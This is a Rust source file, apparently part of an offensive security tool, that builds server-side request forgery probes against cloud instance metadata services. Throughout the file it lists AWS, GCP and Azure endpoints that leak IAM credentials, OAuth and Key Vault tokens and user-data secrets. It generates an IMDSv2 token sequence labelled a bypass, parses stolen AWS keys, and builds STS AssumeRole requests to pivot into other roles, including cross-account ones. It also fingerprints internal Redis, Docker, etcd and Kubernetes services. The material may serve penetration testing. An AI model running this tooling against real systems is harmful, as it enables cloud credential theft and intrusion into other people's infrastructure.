use std::collections::HashMap;

/// Cloud provider target for SSRF pivoting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
}

impl std::fmt::Display for CloudProvider {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Aws => write!(f, "AWS"),
            Self::Gcp => write!(f, "GCP"),
            Self::Azure => write!(f, "Azure"),
        }
    }
}

/// Metadata endpoint version for AWS IMDSv1 vs IMDSv2.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ImdsVersion {
    V1,
    V2,
}

/// HTTP method for SSRF probe requests.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HttpMethod {
    Get,
    Put,
    Post,
}

impl std::fmt::Display for HttpMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Get => write!(f, "GET"),
            Self::Put => write!(f, "PUT"),
            Self::Post => write!(f, "POST"),
        }
    }
}

/// A single SSRF probe request to be issued through the vulnerable endpoint.
#[derive(Debug, Clone, PartialEq)]
pub struct SsrfProbeRequest {
    pub method: HttpMethod,
    pub url: String,
    pub headers: HashMap<String, String>,
    pub description: String,
}

/// Parsed AWS temporary credentials from an STS / metadata response.
#[derive(Debug, Clone, PartialEq)]
pub struct AwsTempCredentials {
    pub access_key_id: String,
    pub secret_access_key: String,
    pub session_token: String,
    pub expiration: Option<String>,
    pub assumed_role_arn: Option<String>,
}

/// A single assumable IAM role discovered during credential chain resolution.
#[derive(Debug, Clone, PartialEq)]
pub struct AssumableRole {
    pub role_arn: String,
    pub account_id: String,
    pub role_name: String,
    pub is_cross_account: bool,
}

/// Result of enumerating the STS credential chain from leaked creds.
#[derive(Debug, Clone, PartialEq)]
pub struct CredentialChainResult {
    pub source_credentials: AwsTempCredentials,
    pub caller_identity_url: String,
    pub assumable_roles: Vec<AssumableRole>,
    pub assume_role_requests: Vec<SsrfProbeRequest>,
}

/// An internal service discovered via SSRF probing.
#[derive(Debug, Clone, PartialEq)]
pub struct InternalService {
    pub name: String,
    pub port: u16,
    pub probe_url: String,
    pub description: String,
}

/// Metadata endpoint path for a cloud provider.
#[derive(Debug, Clone, PartialEq)]
pub struct MetadataPath {
    pub provider: CloudProvider,
    pub path: String,
    pub description: String,
}

/// Full result of an SSRF cloud pivot analysis.
#[derive(Debug, Clone)]
pub struct CloudPivotResult {
    pub metadata_requests: Vec<SsrfProbeRequest>,
    pub credential_chain: Option<CredentialChainResult>,
    pub internal_services: Vec<InternalService>,
    pub multi_cloud_paths: Vec<MetadataPath>,
}

// ---------------------------------------------------------------------------
// AWS metadata paths (IMDSv1 + IMDSv2)
// ---------------------------------------------------------------------------

const AWS_METADATA_BASE: &str = "http://169.254.169.254";
const AWS_TOKEN_ENDPOINT: &str = "http://169.254.169.254/latest/api/token";
const AWS_TOKEN_TTL_HEADER: &str = "X-aws-ec2-metadata-token-ttl-seconds";
const AWS_TOKEN_HEADER: &str = "X-aws-ec2-metadata-token";

/// Paths under the AWS instance metadata service that leak useful information.
const AWS_METADATA_PATHS: &[(&str, &str)] = &[
    (
        "/latest/meta-data/iam/security-credentials/",
        "List IAM role names attached to instance",
    ),
    ("/latest/meta-data/iam/info", "IAM instance profile info"),
    (
        "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "EC2 identity credentials",
    ),
    ("/latest/meta-data/hostname", "Internal hostname"),
    ("/latest/meta-data/local-ipv4", "Internal IPv4 address"),
    ("/latest/meta-data/public-ipv4", "Public IPv4 (if assigned)"),
    (
        "/latest/meta-data/network/interfaces/macs/",
        "Network interface MACs",
    ),
    (
        "/latest/meta-data/placement/availability-zone",
        "Availability zone",
    ),
    ("/latest/meta-data/services/domain", "AWS service domain"),
    (
        "/latest/user-data",
        "User-data script (may contain secrets)",
    ),
    (
        "/latest/dynamic/instance-identity/document",
        "Instance identity document (account ID, region)",
    ),
];

// ---------------------------------------------------------------------------
// GCP metadata paths
// ---------------------------------------------------------------------------

const GCP_METADATA_BASE: &str = "http://metadata.google.internal";
const GCP_METADATA_HEADER: (&str, &str) = ("Metadata-Flavor", "Google");

const GCP_METADATA_PATHS: &[(&str, &str)] = &[
    (
        "/computeMetadata/v1/instance/service-accounts/default/token",
        "GCP OAuth2 access token",
    ),
    (
        "/computeMetadata/v1/instance/service-accounts/default/email",
        "Service account email",
    ),
    (
        "/computeMetadata/v1/instance/service-accounts/default/scopes",
        "OAuth2 scopes",
    ),
    ("/computeMetadata/v1/project/project-id", "GCP project ID"),
    (
        "/computeMetadata/v1/project/numeric-project-id",
        "Numeric project ID",
    ),
    ("/computeMetadata/v1/instance/hostname", "Instance hostname"),
    ("/computeMetadata/v1/instance/zone", "Instance zone"),
    (
        "/computeMetadata/v1/instance/network-interfaces/0/ip",
        "Internal IP",
    ),
    (
        "/computeMetadata/v1/instance/attributes/kube-env",
        "Kubernetes environment (GKE)",
    ),
    (
        "/computeMetadata/v1/instance/attributes/",
        "All custom metadata attributes",
    ),
];

// ---------------------------------------------------------------------------
// Azure metadata paths
// ---------------------------------------------------------------------------

const AZURE_METADATA_BASE: &str = "http://169.254.169.254";
const AZURE_METADATA_HEADER: (&str, &str) = ("Metadata", "true");
const AZURE_API_VERSION: &str = "2021-02-01";

const AZURE_METADATA_PATHS: &[(&str, &str)] = &[
    (
        "/metadata/instance?api-version={VERSION}",
        "Full instance metadata",
    ),
    (
        "/metadata/identity/oauth2/token?api-version={VERSION}&resource=https://management.azure.com/",
        "Azure managed identity token",
    ),
    (
        "/metadata/identity/oauth2/token?api-version={VERSION}&resource=https://vault.azure.net",
        "Key Vault access token",
    ),
    (
        "/metadata/identity/oauth2/token?api-version={VERSION}&resource=https://storage.azure.com/",
        "Storage access token",
    ),
    (
        "/metadata/instance/compute/subscriptionId?api-version={VERSION}&format=text",
        "Subscription ID",
    ),
    (
        "/metadata/instance/compute/resourceGroupName?api-version={VERSION}&format=text",
        "Resource group name",
    ),
    (
        "/metadata/instance/compute/name?api-version={VERSION}&format=text",
        "VM name",
    ),
    (
        "/metadata/instance/compute/location?api-version={VERSION}&format=text",
        "VM region",
    ),
    (
        "/metadata/instance/network?api-version={VERSION}",
        "Network configuration",
    ),
    (
        "/metadata/instance/compute/userData?api-version={VERSION}&format=text",
        "User data (may contain secrets)",
    ),
];

// ---------------------------------------------------------------------------
// Common internal services probed via SSRF
// ---------------------------------------------------------------------------

const INTERNAL_SERVICES: &[(&str, u16, &str)] = &[
    ("Redis", 6379, "Redis in-memory cache / session store"),
    ("Memcached", 11211, "Memcached distributed cache"),
    (
        "Elasticsearch",
        9200,
        "Elasticsearch search / logging cluster",
    ),
    ("Kibana", 5601, "Kibana dashboard UI"),
    ("MySQL", 3306, "MySQL relational database"),
    ("PostgreSQL", 5432, "PostgreSQL relational database"),
    ("MongoDB", 27017, "MongoDB document store"),
    ("RabbitMQ Management", 15672, "RabbitMQ management API"),
    ("Consul", 8500, "HashiCorp Consul service mesh"),
    ("etcd", 2379, "etcd key-value store (Kubernetes)"),
    ("CouchDB", 5984, "CouchDB document database"),
    ("Docker API", 2375, "Docker daemon unencrypted API"),
    ("Kubernetes API", 8443, "Kubernetes API server"),
    ("Prometheus", 9090, "Prometheus metrics endpoint"),
    ("Grafana", 3000, "Grafana dashboard UI"),
];

// ---------------------------------------------------------------------------
// IMDSv2 bypass sequence generation
// ---------------------------------------------------------------------------

/// Generate the two-step IMDSv2 token fetch + metadata read sequence.
///
/// Step 1: PUT request to token endpoint with TTL header.
/// Step 2: GET request to metadata path carrying the returned token.
pub fn generate_imdsv2_bypass(
    metadata_path: &str,
    token_ttl_seconds: u32,
) -> Vec<SsrfProbeRequest> {
    let mut headers_put = HashMap::new();
    headers_put.insert(
        AWS_TOKEN_TTL_HEADER.to_string(),
        token_ttl_seconds.to_string(),
    );

    let token_request = SsrfProbeRequest {
        method: HttpMethod::Put,
        url: AWS_TOKEN_ENDPOINT.to_string(),
        headers: headers_put,
        description: format!(
            "IMDSv2 token request (TTL={}s) — response body is the session token",
            token_ttl_seconds
        ),
    };

    let mut headers_get = HashMap::new();
    headers_get.insert(
        AWS_TOKEN_HEADER.to_string(),
        "<TOKEN_FROM_STEP_1>".to_string(),
    );

    let metadata_request = SsrfProbeRequest {
        method: HttpMethod::Get,
        url: format!("{AWS_METADATA_BASE}{metadata_path}"),
        headers: headers_get,
        description: format!("IMDSv2 metadata fetch: {metadata_path}"),
    };

    vec![token_request, metadata_request]
}

// ---------------------------------------------------------------------------
// AWS credential chain resolution
// ---------------------------------------------------------------------------

/// Parse AWS temporary credentials from a JSON STS / metadata response body.
///
/// Expects the standard AWS JSON shape with `AccessKeyId`, `SecretAccessKey`,
/// `Token` (or `SessionToken`), and optional `Expiration`.
pub fn parse_aws_credentials(json_body: &str) -> Option<AwsTempCredentials> {
    let val: serde_json::Value = serde_json::from_str(json_body).ok()?;

    let access_key_id = val
        .get("AccessKeyId")
        .or_else(|| val.get("Credentials").and_then(|c| c.get("AccessKeyId")))
        .and_then(|v| v.as_str())
        .map(String::from)?;

    let secret_access_key = val
        .get("SecretAccessKey")
        .or_else(|| {
            val.get("Credentials")
                .and_then(|c| c.get("SecretAccessKey"))
        })
        .and_then(|v| v.as_str())
        .map(String::from)?;

    let session_token = val
        .get("Token")
        .or_else(|| val.get("SessionToken"))
        .or_else(|| val.get("Credentials").and_then(|c| c.get("SessionToken")))
        .and_then(|v| v.as_str())
        .map(String::from)?;

    let expiration = val
        .get("Expiration")
        .or_else(|| val.get("Credentials").and_then(|c| c.get("Expiration")))
        .and_then(|v| v.as_str())
        .map(String::from);

    let assumed_role_arn = val
        .get("AssumedRoleUser")
        .and_then(|u| u.get("Arn"))
        .and_then(|v| v.as_str())
        .map(String::from);

    Some(AwsTempCredentials {
        access_key_id,
        secret_access_key,
        session_token,
        expiration,
        assumed_role_arn,
    })
}

/// Parse an ARN string into (account_id, role_name). Returns `None` for malformed ARNs.
fn parse_role_arn(arn: &str) -> Option<(String, String)> {
    // arn:aws:iam::123456789012:role/MyRole
    let parts: Vec<&str> = arn.split(':').collect();
    if parts.len() < 6 {
        return None;
    }
    let account_id = parts[4].to_string();
    let resource = parts[5..].join(":");
    let role_name = resource
        .strip_prefix("role/")
        .unwrap_or(&resource)
        .to_string();
    Some((account_id, role_name))
}

/// Build the STS AssumeRole request URL for a given role ARN and session name.
fn build_assume_role_url(role_arn: &str, session_name: &str) -> String {
    format!(
        "https://sts.amazonaws.com/?Action=AssumeRole&RoleArn={}&RoleSessionName={}&Version=2011-06-15",
        role_arn, session_name,
    )
}

/// Enumerate assumable roles from a list of role ARNs and the source account.
///
/// Roles in a different account than `source_account_id` are flagged as cross-account.
pub fn enumerate_assumable_roles(
    role_arns: &[&str],
    source_account_id: &str,
) -> Vec<AssumableRole> {
    role_arns
        .iter()
        .filter_map(|arn| {
            let (account_id, role_name) = parse_role_arn(arn)?;
            let is_cross_account = account_id != source_account_id;
            Some(AssumableRole {
                role_arn: arn.to_string(),
                account_id,
                role_name,
                is_cross_account,
            })
        })
        .collect()
}

/// Produce the full credential chain analysis: caller identity URL, assumable
/// roles, and the SSRF requests needed to execute each AssumeRole call.
pub fn resolve_credential_chain(
    creds: AwsTempCredentials,
    role_arns: &[&str],
    source_account_id: &str,
) -> CredentialChainResult {
    let caller_identity_url =
        "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15".to_string();

    let assumable_roles = enumerate_assumable_roles(role_arns, source_account_id);

    let assume_role_requests = assumable_roles
        .iter()
        .map(|role| {
            let url = build_assume_role_url(&role.role_arn, "aegis-pivot");
            let mut headers = HashMap::new();
            headers.insert(
                "X-Amz-Security-Token".to_string(),
                creds.session_token.clone(),
            );
            SsrfProbeRequest {
                method: HttpMethod::Get,
                url,
                headers,
                description: format!(
                    "AssumeRole {} (account {}{})",
                    role.role_name,
                    role.account_id,
                    if role.is_cross_account {
                        " — CROSS-ACCOUNT"
                    } else {
                        ""
                    }
                ),
            }
        })
        .collect();

    CredentialChainResult {
        source_credentials: creds,
        caller_identity_url,
        assumable_roles,
        assume_role_requests,
    }
}

// ---------------------------------------------------------------------------
// Multi-cloud metadata path enumeration
// ---------------------------------------------------------------------------

/// Collect all metadata paths for all three cloud providers.
pub fn all_cloud_metadata_paths() -> Vec<MetadataPath> {
    let mut paths = Vec::new();

    for (p, desc) in AWS_METADATA_PATHS {
        paths.push(MetadataPath {
            provider: CloudProvider::Aws,
            path: format!("{AWS_METADATA_BASE}{p}"),
            description: desc.to_string(),
        });
    }

    for (p, desc) in GCP_METADATA_PATHS {
        paths.push(MetadataPath {
            provider: CloudProvider::Gcp,
            path: format!("{GCP_METADATA_BASE}{p}"),
            description: desc.to_string(),
        });
    }

    for (p, desc) in AZURE_METADATA_PATHS {
        let resolved = p.replace("{VERSION}", AZURE_API_VERSION);
        paths.push(MetadataPath {
            provider: CloudProvider::Azure,
            path: format!("{AZURE_METADATA_BASE}{resolved}"),
            description: desc.to_string(),
        });
    }

    paths
}

/// Collect metadata paths filtered to a single provider.
pub fn cloud_metadata_paths_for(provider: CloudProvider) -> Vec<MetadataPath> {
    all_cloud_metadata_paths()
        .into_iter()
        .filter(|p| p.provider == provider)
        .collect()
}

// ---------------------------------------------------------------------------
// AWS metadata probe requests (IMDSv1 — simple GET)
// ---------------------------------------------------------------------------

/// Generate IMDSv1 (plain GET) probe requests for all known AWS metadata paths.
pub fn aws_imdsv1_probes() -> Vec<SsrfProbeRequest> {
    AWS_METADATA_PATHS
        .iter()
        .map(|(path, desc)| SsrfProbeRequest {
            method: HttpMethod::Get,
            url: format!("{AWS_METADATA_BASE}{path}"),
            headers: HashMap::new(),
            description: desc.to_string(),
        })
        .collect()
}

// ---------------------------------------------------------------------------
// GCP metadata probe requests (requires Metadata-Flavor header)
// ---------------------------------------------------------------------------

/// Generate GCP metadata probe requests (each needs `Metadata-Flavor: Google`).
pub fn gcp_metadata_probes() -> Vec<SsrfProbeRequest> {
    GCP_METADATA_PATHS
        .iter()
        .map(|(path, desc)| {
            let mut headers = HashMap::new();
            headers.insert(
                GCP_METADATA_HEADER.0.to_string(),
                GCP_METADATA_HEADER.1.to_string(),
            );
            SsrfProbeRequest {
                method: HttpMethod::Get,
                url: format!("{GCP_METADATA_BASE}{path}"),
                headers,
                description: desc.to_string(),
            }
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Azure metadata probe requests (requires Metadata: true header)
// ---------------------------------------------------------------------------

/// Generate Azure IMDS probe requests (each needs `Metadata: true`).
pub fn azure_metadata_probes() -> Vec<SsrfProbeRequest> {
    AZURE_METADATA_PATHS
        .iter()
        .map(|(path, desc)| {
            let resolved = path.replace("{VERSION}", AZURE_API_VERSION);
            let mut headers = HashMap::new();
            headers.insert(
                AZURE_METADATA_HEADER.0.to_string(),
                AZURE_METADATA_HEADER.1.to_string(),
            );
            SsrfProbeRequest {
                method: HttpMethod::Get,
                url: format!("{AZURE_METADATA_BASE}{resolved}"),
                headers,
                description: desc.to_string(),
            }
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Internal service probing
// ---------------------------------------------------------------------------

/// Generate SSRF probe requests for common internal services on a given host.
///
/// Returns at least 10 distinct services (the constant table contains 15).
pub fn internal_service_probes(target_host: &str) -> Vec<InternalService> {
    INTERNAL_SERVICES
        .iter()
        .map(|(name, port, desc)| {
            let probe_url = format!("http://{}:{}/", target_host, port);
            InternalService {
                name: name.to_string(),
                port: *port,
                probe_url,
                description: desc.to_string(),
            }
        })
        .collect()
}

/// Convert an `InternalService` list into concrete SSRF probe requests, each
/// with a service-appropriate path for fingerprinting.
pub fn internal_service_probe_requests(target_host: &str) -> Vec<SsrfProbeRequest> {
    let fingerprint_paths: &[(&str, u16, &str)] = &[
        ("Redis", 6379, "INFO\r\n"),
        ("Memcached", 11211, "stats\r\n"),
        ("Elasticsearch", 9200, "/"),
        ("Kibana", 5601, "/api/status"),
        ("MySQL", 3306, "/"),
        ("PostgreSQL", 5432, "/"),
        ("MongoDB", 27017, "/"),
        ("RabbitMQ Management", 15672, "/api/overview"),
        ("Consul", 8500, "/v1/agent/self"),
        ("etcd", 2379, "/version"),
        ("CouchDB", 5984, "/"),
        ("Docker API", 2375, "/version"),
        ("Kubernetes API", 8443, "/version"),
        ("Prometheus", 9090, "/api/v1/status/config"),
        ("Grafana", 3000, "/api/health"),
    ];

    fingerprint_paths
        .iter()
        .map(|(name, port, path)| SsrfProbeRequest {
            method: HttpMethod::Get,
            url: format!("http://{}:{}{}", target_host, port, path),
            headers: HashMap::new(),
            description: format!("Probe {} on port {}", name, port),
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Full pivot orchestration
// ---------------------------------------------------------------------------

/// Run the complete SSRF-to-cloud pivot analysis.
///
/// Produces metadata fetch requests (all three clouds), optional credential
/// chain analysis (if AWS creds were recovered), and internal service probes.
pub fn analyze_cloud_pivot(
    aws_creds_json: Option<&str>,
    role_arns: &[&str],
    source_account_id: &str,
    internal_target_host: &str,
) -> CloudPivotResult {
    let mut metadata_requests = Vec::new();
    metadata_requests.extend(aws_imdsv1_probes());
    metadata_requests.extend(gcp_metadata_probes());
    metadata_requests.extend(azure_metadata_probes());

    let credential_chain = aws_creds_json.and_then(|json| {
        let creds = parse_aws_credentials(json)?;
        Some(resolve_credential_chain(
            creds,
            role_arns,
            source_account_id,
        ))
    });

    let internal_services = internal_service_probes(internal_target_host);
    let multi_cloud_paths = all_cloud_metadata_paths();

    CloudPivotResult {
        metadata_requests,
        credential_chain,
        internal_services,
        multi_cloud_paths,
    }
}
